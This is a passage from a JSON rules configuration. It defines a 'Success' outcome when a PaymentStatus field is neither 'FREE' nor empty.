              "mode": "And"
            },
            {
              "result": "Success",
              "conditions": [
                {
                  "source": "PaymentStatus",
                  "comparison": "NotEqualTo",
                  "value": "FREE"
                },
                {
                  "source": "PaymentStatus",
                  "comparison": "NotEqualTo",
                  "value": ""
                }
              ],
              "mode": "And"
            }
